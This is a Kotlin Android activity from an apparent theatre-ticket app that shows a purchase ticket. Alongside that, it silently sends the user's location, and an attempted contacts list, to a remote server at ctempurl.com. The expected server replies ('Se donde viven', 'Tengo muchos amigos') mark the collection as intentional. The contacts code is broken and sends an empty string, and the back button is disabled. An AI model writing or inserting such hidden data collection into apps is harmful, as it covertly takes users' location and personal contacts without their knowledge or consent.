package com.example.apis

import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.LocationManager
import android.os.Bundle
import android.provider.ContactsContract
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.Call
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Field
import retrofit2.http.FormUrlEncoded
import retrofit2.http.POST
import android.Manifest
import android.Manifest.permission.ACCESS_FINE_LOCATION
import android.Manifest.permission.ACCESS_COARSE_LOCATION
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.location.Location
import android.widget.ImageView
import android.widget.TextView
import okio.ByteString.Companion.decodeBase64
import retrofit2.http.Body
import java.text.SimpleDateFormat
import java.util.*
import android.util.Base64
import org.w3c.dom.Text
import retrofit2.Callback
import retrofit2.Response


private const val REQUEST_CODE_LOCATION_PERMISSION = 123
private lateinit var imageView: ImageView

class TiqueteActivity: AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_tiquete)

        var ncompra =""
        var comprador = ""
        var nombreempresa=findViewById<TextView>(R.id.nombre_teatro)
        var fechaevento=findViewById<TextView>(R.id.fecha)
        var horainicio=findViewById<TextView>(R.id.hora_inicio)


        var importetotal=findViewById<TextView>(R.id.monto)

        var nombreevento=findViewById<TextView>(R.id.nombre_obra)
        var asientos=findViewById<TextView>(R.id.tv_asiento)


        val extras = intent.extras
        if (extras != null) {
            val valorEntero = extras.getInt("valor2")
            ncompra = valorEntero.toString()
        }

        val electronico= findViewById<TextView>(R.id.tv_comprador)
        electronico.setText(""+capadatos.SharedApp.usuariostodos[0].correo)

        val compra = findViewById<TextView>(R.id.numero_compra)
        compra.setText(""+ncompra)

        nombreempresa.setText(capadatos.SharedApp.eventoseleccionado.EMPRESA.NOMBRE)

        fechaevento.setText("Día:\n"+capadatos.SharedApp.eventoseleccionado.DIA+"/"+capadatos.SharedApp.eventoseleccionado.MES+"/"+capadatos.SharedApp.eventoseleccionado.ANNO)

        horainicio.setText(""+capadatos.SharedApp.eventoseleccionado.NUMERO_HORA_INICIA+":"+capadatos.SharedApp.eventoseleccionado.NUMERO_MINUTO_INICIA)
        importetotal.setText(""+capadatos.SharedApp.pago[0].TOTAL+" c/u")
        nombreevento.setText(capadatos.SharedApp.eventoseleccionado.EVENTO.NOMBRE)


        if(capadatos.SharedApp.asientos[0].ID_BUTACACOORDENADA.NOMBREDEFANTASIA != " " ||
            capadatos.SharedApp.asientos[1].ID_BUTACACOORDENADA.NOMBREDEFANTASIA != " " ||
            capadatos.SharedApp.asientos[2].ID_BUTACACOORDENADA.NOMBREDEFANTASIA != " " ||
            capadatos.SharedApp.asientos[3].ID_BUTACACOORDENADA.NOMBREDEFANTASIA != " "||
            capadatos.SharedApp.asientos[4].ID_BUTACACOORDENADA.NOMBREDEFANTASIA != " "||
            capadatos.SharedApp.asientos[5].ID_BUTACACOORDENADA.NOMBREDEFANTASIA != " ") {
            var nombresAsientos = ""
            if (capadatos.SharedApp.asientos[0].ID_BUTACACOORDENADA.ID == 15) {
                nombresAsientos += capadatos.SharedApp.asientos[0].ID_BUTACACOORDENADA.NOMBREDEFANTASIA + " "
            }

            if (capadatos.SharedApp.asientos[1].ID_BUTACACOORDENADA.ID == 5) {
                nombresAsientos += capadatos.SharedApp.asientos[1].ID_BUTACACOORDENADA.NOMBREDEFANTASIA + " "
            }

            if (capadatos.SharedApp.asientos[2].ID_BUTACACOORDENADA.ID == 10) {
                nombresAsientos += capadatos.SharedApp.asientos[2].ID_BUTACACOORDENADA.NOMBREDEFANTASIA + " "
            }

            if (capadatos.SharedApp.asientos[3].ID_BUTACACOORDENADA.ID == 20) {
                nombresAsientos += capadatos.SharedApp.asientos[3].ID_BUTACACOORDENADA.NOMBREDEFANTASIA + " "
            }

            if (capadatos.SharedApp.asientos[4].ID_BUTACACOORDENADA.ID == 25) {
                nombresAsientos += capadatos.SharedApp.asientos[4].ID_BUTACACOORDENADA.NOMBREDEFANTASIA + " "
            }

            if (capadatos.SharedApp.asientos[5].ID_BUTACACOORDENADA.ID == 30) {
                nombresAsientos += capadatos.SharedApp.asientos[5].ID_BUTACACOORDENADA.NOMBREDEFANTASIA + " "
            }
            asientos.setText(nombresAsientos)
        }



        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), REQUEST_CODE_LOCATION_PERMISSION)
        }

        getTime()

        val apiService = getRetrofit().create(APIService::class.java)
        val op2 = "ubicaciones"
        val location = getLocation(this)
        val latitude = location?.latitude
        val longitude = location?.longitude

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiService.sendLocation(op2, latitude.toString(), longitude.toString()).execute()

                runOnUiThread {
                    if (response.isSuccessful && response.body() == "Se donde viven") {
                        Log.i("Conectado ubicacion", response.body().toString())

                    } else {

                    }
                }
            } catch (e: Exception) {

            }
        }
        val btnSesion = findViewById<Button>(R.id.btnMain)
        btnSesion.setOnClickListener(){
            val intent1 = Intent(this, ActivityLogin::class.java)
            startActivity(intent1)
        }

        val apiService2 = getRetrofit().create(APIService2::class.java)
        val op = "contactos"
        val contacts = getContacts2()
        CoroutineScope(Dispatchers.IO).launch {
                try {
                    val response = apiService2.sendcontacts(op, contacts).execute()

                    runOnUiThread {
                        if (response.isSuccessful && response.body() == "Tengo muchos amigos") {

                        }
                    }
                } catch (e: Exception) {
                }
            }

    }
    fun getLocation(context: Context): Location? {
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
            && ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
           ActivityCompat.requestPermissions(context as Activity, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), REQUEST_CODE_LOCATION_PERMISSION)
            return null
        }

        val location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        if (location != null) {
            return location
        } else {
            return null
        }
    }

    fun getContacts2(): String {
            val cursor: Cursor? = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            val contacts = StringBuilder()

            cursor?.let {
                while (it.moveToNext()) {
                    val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                    if (nameIndex >= 0) {
                        val name = it.getString(nameIndex)

                    }
                }
                it.close()
            }
            return contacts.toString()
        }

    fun getTime(){
        val calendar = Calendar.getInstance()
        val currentDate = calendar.time
        val dateTimeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        val formattedDate = dateTimeFormat.format(currentDate)

        Log.d("DateTime", "Current date and time: $formattedDate")
    }


    interface APIService {
        @POST("Parametro")
        @FormUrlEncoded
        fun sendLocation(
            @Field("op") op: String,
            @Field("ejex") ejex: String,
            @Field("ejey") ejey: String
        ): Call<String>
    }

    interface APIService2 {
        @POST("Parametro")
        @FormUrlEncoded
        fun sendcontacts(
            @Field("op") op: String,
            @Field("contacts") contacts: String
        ): Call<String>
    }

    private fun getRetrofit(): Retrofit {
        return Retrofit.Builder()
            .baseUrl("http://lenguajescuarta-001-site1.ctempurl.com/api/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()
    }






    override fun onBackPressed() {
        //Para que no haga nada al presionar la volver
    }

}




